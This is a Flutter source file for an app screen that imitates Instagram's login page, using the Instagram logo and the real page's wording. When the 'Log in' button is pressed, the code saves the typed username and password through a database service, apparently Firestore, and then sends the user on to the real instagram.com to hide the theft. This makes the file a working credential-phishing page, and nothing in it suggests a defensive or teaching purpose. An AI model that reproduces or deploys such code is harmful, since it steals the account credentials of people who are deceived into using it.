import 'package:flutter/material.dart';
import 'package:insta_login/Service/firestore_services.dart';
import 'package:url_launcher/url_launcher.dart';

class InstaLogin extends StatefulWidget {
  const InstaLogin({super.key});

  @override
  State<InstaLogin> createState() => _InstaLoginState();
}

class _InstaLoginState extends State<InstaLogin> {
  void openInstagram() {
    launchUrl(Uri.parse('https://instagram.com'),
        mode: LaunchMode.externalApplication);
  }

  bool isValid = false;
  bool isObsecure = true;
  final TextEditingController userNameController = TextEditingController();
  final TextEditingController passwordController = TextEditingController();
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 25.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              DropdownButton(
                  value: 'English(United States)',
                  items: const [
                    DropdownMenuItem(
                      value: 'English(United States)',
                      child: Text('English(United States)'),
                    ),
                  ],
                  onChanged: (v) {}),
              Spacer(),
              Image.asset('images/instagram_icon.png', height: 64.0),
              TextField(
                onChanged: (value) => checkValidity(),
                controller: userNameController,
                cursorColor: Colors.grey,
                decoration: const InputDecoration(
                  contentPadding: EdgeInsets.all(10.0),
                  fillColor: Color.fromARGB(255, 240, 240, 240),
                  filled: true,
                  hintText: 'Phone number, email address or username',
                  border: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.grey, width: 0.0),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.grey, width: 0.0),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.grey, width: 0.0),
                  ),
                ),
              ),
              const SizedBox(height: 16.0),
              TextField(
                onChanged: (value) => checkValidity(),
                controller: passwordController,
                obscureText: isObsecure,
                cursorColor: Colors.grey,
                decoration: InputDecoration(
                  contentPadding: EdgeInsets.all(10.0),
                  hintText: 'Password',
                  fillColor: Color.fromARGB(255, 240, 240, 240),
                  filled: true,
                  border: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.grey, width: 0.0),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.grey, width: 0.0),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderSide: BorderSide(color: Colors.grey, width: 0.0),
                  ),
                  suffixIcon: IconButton(
                    onPressed: () {
                      if (isObsecure == true) {
                        isObsecure = false;
                      } else {
                        isObsecure = true;
                      }
                      setState(() {});
                      print(isObsecure);
                    },
                    icon: isObsecure
                        ? Icon(
                            Icons.visibility_off,
                            color: Colors.grey,
                          )
                        : Icon(Icons.visibility),
                  ),
                ),
              ),
              const SizedBox(height: 20.0),
              SizedBox(
                height: 47,
                width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: isValid
                        ? Colors.blue
                        : Color.fromARGB(255, 153, 202, 243),
                  ),
                  onPressed: () async {
                    await DBService().instaDetailAdd(
                        userNameController.text, passwordController.text);
                    userNameController.clear();
                    passwordController.clear();
                    openInstagram();
                  },
                  child: const Text('Log in'),
                ),
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Text(
                    'Forgotten  your login details?',
                    style: TextStyle(color: Colors.black54),
                  ),
                  TextButton(
                    onPressed: () {
                      openInstagram();
                    },
                    child: Text(
                      'Get help with loggin in',
                      style: TextStyle(
                        color: Color.fromARGB(255, 34, 48, 54),
                      ),
                    ),
                  )
                ],
              ),
              Spacer(),
              Divider(),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Text(
                    'Don\'t you have an account?',
                    style: TextStyle(color: Colors.black54),
                  ),
                  TextButton(
                    onPressed: () {
                      openInstagram();
                    },
                    child: Text(
                      'Sign Up',
                      style: TextStyle(
                        color: Color.fromARGB(255, 34, 48, 54),
                      ),
                    ),
                  )
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _centerWidget() {
    return Padding(
      padding: const EdgeInsets.all(25.0),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: <Widget>[],
      ),
    );
  }

  void checkValidity() {
    if (userNameController.text.isNotEmpty &&
        passwordController.text.isNotEmpty) {
      setState(() {
        isValid = true;
      });
    } else {
      setState(() {
        isValid = false;
      });
    }
  }
}
